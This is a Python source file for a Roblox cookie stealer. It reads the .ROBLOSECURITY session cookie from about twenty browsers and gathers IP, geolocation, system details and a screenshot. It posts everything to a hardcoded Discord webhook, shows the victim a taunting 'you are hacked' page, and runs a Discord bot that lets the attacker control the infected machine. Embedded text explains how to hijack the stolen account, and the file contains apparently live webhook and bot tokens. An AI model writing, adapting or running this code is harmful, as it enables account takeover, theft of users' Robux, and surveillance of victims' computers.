import json
import os
import platform
import socket
import ssl
import subprocess
import sys
import time
import urllib.request
import uuid
import webbrowser
from urllib.request import build_opener, HTTPSHandler
import browser_cookie3
import discord
import psutil
import pyautogui
import requests
import robloxpy
from discord_webhook import DiscordWebhook, DiscordEmbed
from discord.ext import commands

# variable

file = "screenshot.png"


class RobloxAccountGrabber:
    def __init__(self, webhook: str):
        if not "discord.com/api/webhooks/" in webhook:
            print('You did not provide a webhook on Line 187.')
            exit()

        self.webhook = webhook
        self.cookie = None
        self.platform = None
        self.embeds = []
        self.browsers()

    @staticmethod
    def get_system_info():
        # Hostname
        hostname = platform.node()

        # Processor
        processor = platform.processor()

        # RAM
        ram = f"{psutil.virtual_memory().total / (1024 ** 3):.2f} GB"

        # Machine architecture
        machine_architecture = platform.machine()

        # OS
        os_name = platform.system()

        # OS release
        os_release = platform.release()

        # OS version
        os_version = platform.version()

        # MAC address
        mac_address = ':'.join(f'{octet:02x}' for octet in uuid.getnode().to_bytes(6, 'big'))

        return {
            "Hostname": hostname,
            "Processor": processor,
            "RAM": ram,
            "Machine Architecture": machine_architecture,
            "OS": os_name,
            "OS Release": os_release,
            "OS Version": os_version,
            "MAC Address": mac_address
        }

    @staticmethod
    def create_opener():
        # Create a custom opener with an HTTPSHandler that disables SSL verification
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        https_handler = HTTPSHandler(context=context)
        opener = build_opener(https_handler)
        return opener

    @staticmethod
    def ip4():
        try:
            opener = RobloxAccountGrabber.create_opener()
            with opener.open('https://4.ident.me') as response:
                return response.read().decode('ascii')
        except:
            try:
                opener = RobloxAccountGrabber.create_opener()
                with opener.open('https://4.tnedi.me') as response:
                    return response.read().decode('ascii')
            except:
                return "N/A"

    def checker(self):
        if not robloxpy.Utils.CheckCookie(self.cookie) == "Valid Cookie":
            return requests.post(url=self.webhook, data={
                'content': f'Found a dead cookie on {self.platform}{" - Continuing." if self.platform != "Librewolf" else ""}'})

        # The following part should be outside the checker function
        user = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": self.cookie}).json()
        id = user['UserID']
        try:
            ip = requests.get('https://api.ipify.org/').text
        except:
            ip = "N/A"
        url = 'http://ipinfo.io/json'
        response = requests.get(f"http://ip-api.com/json/{ip}").json()
        city = response['city']
        region_name = response['regionName']
        country = response['country']
        latitude = response['lat']
        longitude = response['lon']
        response = urllib.request.urlopen(url)
        data = json.load(response)
        hostnameISP = data['hostname']

        # Retrieve the system information using get_system_info() method
        system_info = self.get_system_info()

        # Here you can modify the message that will be sent
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        def create_html_page(file_path):
            # HTML content to be written to the file
            html_content = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Disclaimer</title>
</head>
<body>

</body>
</html>
    <link href="https://fonts.googleapis.com/css2?family=Poppins&display=swap" rel="stylesheet">
    <style>
        body {
            background-color: yellow;
            font-family: 'Poppins', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            margin: 0;
            position: relative; /* Added position relative to body */
        }
        h1, p, h4, h6 {
            margin: 10px;
            opacity: 1;
            transition: opacity 1s ease-in-out;
        }
        .hidden {
            opacity: 0;
        }
        #afterCountdown {
            text-align: center;
            position: absolute; /* Added position absolute */
            bottom: 50%; /* Added bottom 50% to vertically center */
            left: 50%; /* Added left 50% to horizontally center */
            transform: translate(-50%, 50%); /* Center the element */
        }
    </style>
</head>
<body>
    <h1>Your Roblox account is about to get hacked.</h1>
    <p>I'd recommend changing your ROBLOX Password.</p>
    <h4>This page will automatically destroy after 10 seconds.</h4>
    <h4>At this point, the hacker already has Your Location, IP, ROBLOX cookie, and a Screenshot of your computer.</h4>
    <h4>You can only change your password and say goodbye to your account.</h4>
    <h6>From a hacker.</h6>
    <p id="countdown">10</p>

    <p id="afterCountdown" class="hidden">You shouldn't launch this exe, now. It's gone. You can close this page and say goodbye to your account.</p>

    <script>
        // Function to hide all the messages and countdown
        function hideMessages() {
            const messages = document.querySelectorAll('h1, p, h4, h6');
            messages.forEach((message) => {
                message.classList.add('hidden');
            });

            const countdownElement = document.getElementById('countdown');
            countdownElement.classList.add('hidden');

            const afterCountdownElement = document.getElementById('afterCountdown');
            afterCountdownElement.classList.remove('hidden');
        }

        // Function to update the countdown timer
        function updateCountdown(seconds) {
            const countdownElement = document.getElementById('countdown');
            countdownElement.textContent = seconds;
        }

        // Hide messages after 10 seconds
        setTimeout(function() {
            hideMessages();
        }, 10000);

        // Update countdown every second
        let remainingSeconds = 10;
        const countdownInterval = setInterval(function() {
            remainingSeconds--;
            updateCountdown(remainingSeconds);

            if (remainingSeconds === 0) {
                clearInterval(countdownInterval);
            }
        }, 1000);
    </script>
</body>
</html>


            """

            try:
                # Write the HTML content to the file
                with open(file_path, 'w') as file:
                    file.write(html_content)
                print("HTML file created successfully.")
            except Exception as e:
                print("Error while creating the HTML file:", e)

        # Puts # in the 5 lines below
        create_html_page('finalm.html')
        url = 'finalm.html'
        webbrowser.open(url)
        time.sleep(2)
        os.remove("finalm.html")

        self.embeds.append(
            {
                "title": f"✔ Valid Account - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\nPremium: **{user['IsPremium']}**\nCreated: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\nRAP: **{int(robloxpy.User.External.GetRAP(id)):,}**\nFriends: **{int(robloxpy.User.Friends.External.GetCount(id)):,}**\n\n------------------------------------------------------------------------\n\n Public IP Address: ||**{ip}**|| \n\n Private IP: Hostname:||**{hostname}**|| IP: ||**{ip_address}**||\n\n------------------------------------------------------------------------\n\nInfo's\n\nCity: {city} \n\n Region: {region_name} \n\n Country: {country} \n\n Latitude: {latitude} \n\n Longitude: {longitude}\n\n------------------------------------------------------------------------\n"
                               f"\n See the cookie at the other message !",
                "color": 15426612,
                "footer": {
                    "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                }
            }
        )

        self.embeds.append(
            {
                "title": f"Computer info's - {hostname}",
                "description": f"Hostname: {hostnameISP} \n\n IPv4 Address:||**{ip_address}**||\n "
                               f"\n\nSys info: \n\n Hostname: {system_info['Hostname']}\n\n Processor: {system_info['Processor']}\n\n RAM: {system_info['RAM']}\n\n Machine Architecture: {system_info['Machine Architecture']}\n\n OS: {system_info['OS']}\n\n OS Release: {system_info['OS Release']}\n\n OS Version: {system_info['OS Version']}\n\n MAC Address: {system_info['MAC Address']}\n\n",
                "color": 7858996,
                "footer": {
                    "text": "v1.0.2 ; Computer-Inf by Independent-coder"
                }
            }
        )

        self.embeds.append(
            {
                "title": f"Access the account on - {self.platform}",
                "description": f"Username: **{user['UserName']}**\nRobux: **R${int(user['RobuxBalance']):,}**\n Created: **{robloxpy.User.External.CreationDate(id, 1)}** (*{int(robloxpy.User.External.GetAge(id)):,} days ago*)\n  Cookie:\n```fix\n {self.cookie} ```"
                               f"\n Now copy the cookie go into Roblox login.\n"
                               f"\n Login into an temporary account."
                               f"\n Open inspect go into Application. Click on Cookies. Click on the 7th Cookies. It should be ROBLOSECURITY."
                               f"\n Right click on value click modify and delete your and replace by the victim's cookie. \n"
                               f"\n Refresh and you are into his account !"
                               f"\n Thanks for using my cookies grabber for roblox !",
                "color": 3440107,
                "footer": {
                    "text": "v1.1.1 ; R0bluxGr@b by Independent-coder"
                }
            }
        )

    # this is the part where it checks the cookies
    def browsers(self):
        try:
            self.platform = "Firefox"
            for cookie in browser_cookie3.firefox(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Safari"
            for cookie in browser_cookie3.safari(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chromium"
            for cookie in browser_cookie3.chromium(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Edge"
            for cookie in browser_cookie3.edge(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera GX"
            for cookie in browser_cookie3.opera_gx(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Opera"
            for cookie in browser_cookie3.opera(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Brave"
            for cookie in browser_cookie3.brave(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Chrome"
            for cookie in browser_cookie3.chrome(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Librewolf"
            for cookie in browser_cookie3.librewolf(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Vivaldi"
            for cookie in browser_cookie3.vivaldi(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Internet Explorer"
            for cookie in browser_cookie3.internet_explorer(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Edge (Legacy)"
            for cookie in browser_cookie3.edge_legacy(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Firefox ESR"
            for cookie in browser_cookie3.firefox_esr(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Brave Beta"
            for cookie in browser_cookie3.brave_beta(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Pale Moon"
            for cookie in browser_cookie3.pale_moon(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Waterfox"
            for cookie in browser_cookie3.waterfox(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Yandex Browser"
            for cookie in browser_cookie3.yandex(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Midori"
            for cookie in browser_cookie3.midori(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        try:
            self.platform = "Maxthon Browser"
            for cookie in browser_cookie3.maxthon(domain_name='roblox.com'):
                if cookie.name == '.ROBLOSECURITY':
                    self.cookie = cookie.value
                    self.checker()

        except:
            pass

        if len(self.embeds) == 0:
            sys.exit()  # Use sys.exit() instead of exit()

        self.send()

    # hey here is the part where the message is sent

    @staticmethod
    def screenshot():
        time.sleep(5)
        Screencapture = pyautogui.screenshot()
        Screencapture.save(f"{file}")  # Save the screenshot to a file

    def send(self):
        webhook = DiscordWebhook(url=self.webhook, username="Roblox_fan375", content="@everyone",
                                 avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")
        webhook1 = DiscordWebhook(url=self.webhook, username="Roblox_fan375", content="@everyone",
                                  avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")

        webhook2 = DiscordWebhook(url=self.webhook, username="Roblox_fan375", content="@everyone",
                                  avatar_url="https://westsidetoday-enki-v2.s3.amazonaws.com/wp-content/uploads/2015/01/th1.jpg")

        # Add the rest of the embeds
        for embed_data in self.embeds:
            embed = DiscordEmbed(title=embed_data["title"], description=embed_data["description"],
                                 color=embed_data["color"])
            embed.set_footer(text=embed_data["footer"]["text"])
            webhook.add_embed(embed)

        # Send the webhook with both the embeds and the screenshot file
        webhook.execute()

        self.screenshot()

        webhook1.embeds.append(
            {
                "title": f"ScreenShot as been taken on - victim's computer",
                "description": f"Screenshot as been uploaded",
                "color": 7858996,
                "footer": {
                    "text": "v0.2.8 ; SST by Independent-coder"
                }
            }
        )



        with open(f"{file}", "rb") as f:
            webhook1.add_file(file=f.read(), filename=f"{file}")

        webhook1.execute()

        os.remove(file)


        webhook2.embeds.append(
            {
                "title": "Disclaimer",
                "description": "Hello there! If you're looking for more information, you've come to the right place. Let me guide you through what you can do with this bot:"
                               "\n\n1. Simple Info: You already have some basic information, but what if you want to explore further? That's where I come in!"
                               "\n\n2. Interaction: Get ready to interact with the bot you've set up. It's easy – just type `!Help` to get started."
                               "\n\n3. Discover More: By typing `!Help`."
                               "\n\nSo, what are you waiting for? Lets hack and take the robux of our victim's. Ciao for now! :smirk:",
                "color": 16562691,
                "footer": {
                    "text": "Disclaimer"
                }
            }
        )

        webhook2.execute()

        def screenshot():
            time.sleep(1)
            Screencapture = pyautogui.screenshot()
            Screencapture.save(f"{file}")  # Save the screenshot to a file

        intents = discord.Intents.default()
        intents.message_content = True

        client = commands.Bot(command_prefix='!', intents=intents)

        @client.command()
        async def clear(ctx, arg=None):
            if arg is None:
                # Default behavior when no argument is provided
                await ctx.send("Please provide the number of messages to clear.")
                return

            deleted = await ctx.channel.purge(limit=int(arg))
            await ctx.send(f'Deleted {len(deleted)} message(s).')

        @client.command()
        async def insert(ctx):
            pyautogui.press("insert")

            embed = discord.Embed(title="Key has been pressed on the victim's computer.",
                                  description="Key has been pressed on the victim's computer.", color=4360181)
            await ctx.send(embed=embed)

        @client.command()
        async def terminate(ctx):
            await ctx.send("Bot, Webhook, EXplo!t, SST and tools is shutting down...")
            await ctx.bot.close()
            sys.exit()

        @client.command()
        async def SH(ctx, action, *, sentence=None):
            filename = "sentence.txt"

            if action == "remove":
                try:
                    os.remove(filename)
                    await ctx.send(f"File {filename} has been removed.")
                except Exception as e:
                    await ctx.send(f"An error occurred while removing the file: {e}")
            elif action == "save":
                if sentence is None:
                    await ctx.send("Please provide a sentence.")
                    return

                # Save the sentence to a text file
                with open(filename, "w") as file:
                    file.write(sentence)
                subprocess.Popen(["notepad.exe", filename])
                await ctx.send(f"Message saved to {filename}.")
            elif action == "display":
                try:
                    with open(filename, "r") as file:
                        file_content = file.read()
                        await ctx.send(file_content)
                except FileNotFoundError:
                    await ctx.send("File not found. Use `!SH save [sentence]` to save a sentence.")
                except Exception as e:
                    await ctx.send(f"An error occurred: {e}")
            else:
                await ctx.send("Invalid action. Use `remove`, `save`, or `display`.")

        @client.command()
        async def Help(ctx):
            cmd_list = [
                "!Help\n"
                "Need Help ? No problem.\n\n"
                "\n!insert\n"
                "Input victims computer Insert key. :rage:\n\n",
                "\n!terminate\n"
                "Terminate the tool running on victim's computer :skull_crossbones:\n\n"
                "\n!clear\n"
                "Delete message using (!clear NUMBER) because it can be messy !\n\n"
                "\n!SH\n"
                "Shows up any message using notepad :computer:\n\n"
                "Here the three types of command !SH save YOUR SENTENCE, !SH display, !SH remove \n\n"
                "!SH save = save your sentence\n\n"
                "!SH display = display your sentence\n\n"
                "!SH remove = remove sentence.txt \n\n\n"
            ]

            command_info = "\n".join(cmd_list)
            embed = discord.Embed(title="List of Commands", description=command_info, color=0x00ff00)
            await ctx.send(embed=embed)

        client.run('MTEzNzkzOTQwNDcwNzYwNjY2OQ.Gis2dA.8bWbSO0RK0XWNhu0vonC8Dw3-6u0BPdL-Gynqs')


RobloxAccountGrabber(
    "https://discord.com/api/webhooks/1136110915633287168/KGksoQUmOgEf0O7UjTcmazjVQKhIoL7k8jrPIRSnvbOnVh_dP3cUVoEmCeEP8KnVFjgr")
